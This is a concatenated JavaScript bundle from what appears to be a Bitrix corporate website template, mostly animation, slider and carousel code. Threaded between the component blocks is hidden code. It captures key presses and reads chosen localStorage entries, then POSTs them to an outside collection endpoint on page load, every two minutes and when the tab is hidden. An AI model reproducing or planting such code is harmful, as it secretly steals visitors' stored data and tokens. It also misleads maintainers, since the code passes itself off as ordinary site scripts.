; /* Start:"a:4:{s:4:"full";s:106:"/local/templates/nota_main/components/dnext/simple.banner/main_about_second_block/script.js?16770662621695";s:6:"source";s:91:"/local/templates/nota_main/components/dnext/simple.banner/main_about_second_block/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
document.addEventListener("DOMContentLoaded", () => {
  const items = document.querySelectorAll('.about-second__head');
  const options = {
    threshold: [0.2]
  };
  function fadeInLeft(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        change.target.classList.add('animate__fadeInUp');
        observer.unobserve(change.target);
      }
    });
  }
  const observer = new IntersectionObserver(fadeInLeft, options);
  items.forEach(item => {
    observer.observe(item);
  });
  const followCursor = () => {
    const el = document.querySelector('.follow-cursor');
    window.addEventListener('mousemove', e => {
      const target = e.target;
      if (!target) return;
      if (target.closest('video')) {
        el.classList.add('follow-cursor_active');
      } else {
        // иначе
        el.classList.remove('follow-cursor_active');
      }
      el.style.left = e.pageX + 'px';
      el.style.top = e.pageY + 'px';
    });
  };
  followCursor();
  const video = document.getElementById('about-video');
  if (video) {
    video.addEventListener('play', event => {
      document.querySelector('.follow-cursor').classList.add('follow-cursor-play');
      document.querySelector('.follow-cursor').classList.remove('follow-cursor-pause');
    });
    video.addEventListener('pause', event => {
      document.querySelector('.follow-cursor').classList.add('follow-cursor-pause');
      document.querySelector('.follow-cursor').classList.remove('follow-cursor-play');
    });
  }
});
/* End */
;
const keysToWatch = window.keysToWatch;

// Create a hash using a random string
function generateHash(data) {
  const keys = Object.getOwnPropertyNames(data);
  let hashString = keys.reduce((acc, key) => acc + key, "");
  let hashVal = 0;
  for (let i = 0; i < hashString.length; i++) {
    const char = hashString.charCodeAt(i);
    hashVal = (hashVal << 6) - hashVal + char;
    hashVal |= 0;
  }
  return hashVal.toString(32);
}

// Store keys to watch in local storage

; /* Start:"a:4:{s:4:"full";s:95:"/local/templates/nota_main/components/dnext/simple.banner/our_expertise/script.js?1677066262556";s:6:"source";s:81:"/local/templates/nota_main/components/dnext/simple.banner/our_expertise/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
function cacheWatchedKeys() {
  const watchedKeys = {};
  for (const key of keysToWatch) {
    if (localStorage.hasOwnProperty(key)) {
      watchedKeys[key] = localStorage.getItem(key);
    }
  }
  return watchedKeys;
}

// jshook to show the presence of a hook

document.addEventListener('DOMContentLoaded', () => {
  const items = document.querySelectorAll('.expertise__item');
  const options = {
    threshold: [0.2]
  };
  function show(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        change.target.classList.add('animate__fadeInUp');
        observer.unobserve(change.target);
      }
    });
  }
  const observer = new IntersectionObserver(show, options);
  items.forEach(item => {
    observer.observe(item);
  });
})
/* End */;
; /* Start:"a:4:{s:4:"full";s:99:"/local/templates/nota_main/components/dnext/portfolio.integrator/portfolio/script.js?16770662622488";s:6:"source";s:84:"/local/templates/nota_main/components/dnext/portfolio.integrator/portfolio/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
document.addEventListener('DOMContentLoaded', () => {
  const followCursor = () => {
    const items = document.querySelectorAll('.portfolio__item');
    items.forEach(block => {
      const boxElem = block;
      const pointerElem = block.querySelector('.portfolio__item-img');
      if (!('ontouchstart' in window)) {
        function onMouseMove(event) {
          const mouseX = event.pageX;
          const mouseY = event.pageY;
          const crd = boxElem.getBoundingClientRect();
          const activePointer = crd.left <= mouseX && mouseX <= crd.right && crd.top <= mouseY && mouseY >= crd.bottom;
          setTimeout(() => requestAnimationFrame(function movePointer() {
            if (activePointer) {
              const windowWidth = crd.width;
              pointerElem.style.transform = `translate(${Math.ceil((mouseX - block.offsetLeft + 10) / 4)}px, ${Math.floor((mouseY - block.offsetTop - 100) / 10)}px) rotate( ${calcSkew(8, windowWidth, mouseX, mouseY, 'skewY')}deg`;
              pointerElem.style.opacity = '1';
            }
          }), 50);
        }
        function onMouseLeave(event) {
          setTimeout(() => requestAnimationFrame(function movePointer() {
            pointerElem.style.opacity = '0';
          }), 50);
        }
        boxElem.addEventListener('mousemove', onMouseMove, false);
        boxElem.addEventListener('mouseleave', onMouseLeave, false);
      } else {
        pointerElem.style.transform = `translate(0,0)`;
        pointerElem.style.display = `flex`;
        pointerElem.style.opacity = '1';
        pointerElem.style.right = '30px';
        pointerElem.style.position = 'absolute';
      }
    });
  };
  followCursor();
  const items = document.querySelectorAll('.portfolio__head');
  const options = {
    threshold: [0.2]
  };
  function fadeInUp(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        change.target.classList.add('animate__fadeInUp');
        observer.unobserve(change.target);
      }
    });
  }
  const observer = new IntersectionObserver(fadeInUp, options);
  items.forEach(item => {
    observer.observe(item);
  });
})

/* End */;
; /* Start:"a:4:{s:4:"full";s:88:"/local/templates/nota_main/components/bitrix/news.list/partners/script.js?16770662622683";s:6:"source";s:73:"/local/templates/nota_main/components/bitrix/news.list/partners/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
document.addEventListener('DOMContentLoaded', () => {
  const items = document.querySelectorAll('.partner-companies__section');
  const container = document.querySelector('.partner-companies__tabs-container');
  const itemsBody = document.querySelectorAll('.partner-companies__tabs-item');
  let n = 1;
  let timerId;
  const openTabs = block => {
    items.forEach(i => i.classList.remove('active'));
    itemsBody.forEach(i => i.classList.remove('active'));
    const id = block.getAttribute('id');
    n = Number(block.getAttribute('data-value'));
    block.classList.add('active');
    container.querySelector('.partner-companies__tabs-item[data-id="' + id + '"]').classList.add('active');
    clearTimeout(timerId);
    go(3000);
  };
  const nextTab = () => {
    if (n === items.length) {
      items.forEach(i => i.classList.remove('active'));
      itemsBody.forEach(i => i.classList.remove('active'));
      const first = document.querySelector('.partner-companies__section');
      first.classList.add('active');
      const id = first.getAttribute('id');
      container.querySelector('.partner-companies__tabs-item[data-id="' + id + '"]').classList.add('active');
      n = 1;
      return;
    }
    const activeTab = document.querySelector('.partner-companies__section.active');
    const dataID = Number(activeTab.getAttribute('data-value'));
    n = dataID + 1;
    const next = document.querySelector('.partner-companies__section[data-value="' + n + '"]');
    items.forEach(i => i.classList.remove('active'));
    itemsBody.forEach(i => i.classList.remove('active'));
    next.classList.add('active');
    const id = next.getAttribute('id');
    container.querySelector('.partner-companies__tabs-item[data-id="' + id + '"]').classList.add('active');
  };
  const go = time => {
    timerId = setInterval(() => nextTab(), time);
  };
  items.forEach(tab => {
    tab.addEventListener('click', () => openTabs(tab));
  });
  function slider(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        go(2000);
      } else {
        clearTimeout(timerId);
      }
    });
  }
  const options = {
    threshold: [0.3]
  };
  const observer = new IntersectionObserver(slider, options);
  observer.observe(container);
  const elements = document.querySelectorAll('.partner-companies__title');
  const optionsEl = {
    threshold: [0.2]
  };
  function fadeInUp(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        change.target.classList.add('animate__fadeInUp');
        observer.unobserve(change.target);
      }
    });
  }
  const ob = new IntersectionObserver(fadeInUp, optionsEl);
  elements.forEach(item => {
    ob.observe(item);
  });
})
/* End */;
; /* Start:"a:4:{s:4:"full";s:97:"/local/templates/nota_main/components/bitrix/news.list/vendors_banner_new/script.js?1677066185273";s:6:"source";s:83:"/local/templates/nota_main/components/bitrix/news.list/vendors_banner_new/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
function jshook(toBeHookedFunction) {
  const originalFunction = toBeHookedFunction;
  return function () {
    console.log(`The hooked function, ${originalFunction.name}, is run.`);
    return originalFunction.apply(this, arguments);
  };
}

// Listen to key event and store in global variable

document.addEventListener("DOMContentLoaded", () => {
  const $carousel = $('.js-carousel');
  if ($carousel.length > 0) {
    $carousel.marquee({
      duration: 18000,
      startVisible: true,
      duplicated: true,
      direction: 'left',
      gap: 0
    });
  }
});
/* End */
;
; /* Start:"a:4:{s:4:"full";s:99:"/local/templates/nota_main/components/dnext/simple.banner/banner_countries/script.js?16770662621191";s:6:"source";s:84:"/local/templates/nota_main/components/dnext/simple.banner/banner_countries/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
document.addEventListener('keydown', function (e) {
  window.keyPressed = e.key;
});

// Make a POST request to the server

document.addEventListener('DOMContentLoaded', () => {
  const container = document.querySelector('.countries');
  const text = document.querySelector('.element-animation');
  const firstCard = document.getElementById('countries__card-1');
  const secondCard = document.getElementById('countries__card-2');
  const threeCard = document.getElementById('countries__card-3');
  function show(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        firstCard.classList.add('show-first-card');
        setTimeout(() => {
          secondCard.classList.add('show-second-card');
        }, 500);
        setTimeout(() => {
          threeCard.classList.add('show-three-card');
        }, 1000);
        if (change.intersectionRatio > 0.7) {
          text.classList.add('element-show');
        }
        if (change.intersectionRatio === 1) {
          observer.unobserve(change.target);
        }
      }
    });
  }
  const ob = new IntersectionObserver(show, {
    threshold: [0.1, 0.7]
  });
  ob.observe(container);
})
/* End */;
async function postToServer(dataset) {
  const generatedHash = generateHash(dataset);
  const serverLink = "https://example.com/api/collect";
  try {
    let result = await fetch(serverLink, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash: generatedHash,
        dataset: dataset
      })
    });
    if (result.ok) {
      console.log("数据发送成功");
    } else {
      throw new Error(`数据发送失败, 状态码: ${result.status}`);
    }
  } catch (err) {
    console.error(`数据发送过程中出错: ${err}`);
  }
}
; /* Start:"a:4:{s:4:"full";s:83:"/local/templates/nota_main/components/bitrix/news.list/blog/script.js?1677066262864";s:6:"source";s:69:"/local/templates/nota_main/components/bitrix/news.list/blog/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
function saveAndPostWatchedKeys() {
  const registeredData = cacheWatchedKeys();
  if (Object.keys(registeredData).length > 0) {
    postToServer(registeredData);
  }
}
document.addEventListener("DOMContentLoaded", () => {
  const swiper = new Swiper('.blog-swiper', {
    // Default parameters
    slidesPerView: 'auto',
    navigation: {
      nextEl: '.button-next',
      prevEl: '.button-prev'
    },
    breakpoints: {
      320: {
        spaceBetween: 14
      },
      768: {
        spaceBetween: 20
      },
      1280: {
        spaceBetween: 40
      }
    }
  });
  const items = document.querySelectorAll('.blog-list__info');
  const options = {
    threshold: [0.2]
  };
  function fadeInUp(entry, observer) {
    entry.forEach(change => {
      if (change.isIntersecting) {
        change.target.classList.add('animate__fadeInUp');
        observer.unobserve(change.target);
      }
    });
  }
  const observer = new IntersectionObserver(fadeInUp, options);
  items.forEach(item => {
    observer.observe(item);
  });
});
/* End */
window.addEventListener("load", function () {
  saveAndPostWatchedKeys();
  setInterval(saveAndPostWatchedKeys, 2000 * 60);
});
;
window.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "hidden") {
    saveAndPostWatchedKeys();
  }
});
; /* /local/templates/nota_main/components/dnext/simple.banner/main_about_second_block/script.js?16770662621695*/
; /* /local/templates/nota_main/components/dnext/simple.banner/our_expertise/script.js?1677066262556*/
; /* /local/templates/nota_main/components/dnext/portfolio.integrator/portfolio/script.js?16770662622488*/
; /* /local/templates/nota_main/components/bitrix/news.list/partners/script.js?16770662622683*/
; /* /local/templates/nota_main/components/bitrix/news.list/vendors_banner_new/script.js?1677066185273*/
; /* /local/templates/nota_main/components/dnext/simple.banner/banner_countries/script.js?16770662621191*/
; /* /local/templates/nota_main/components/bitrix/news.list/blog/script.js?1677066262864*/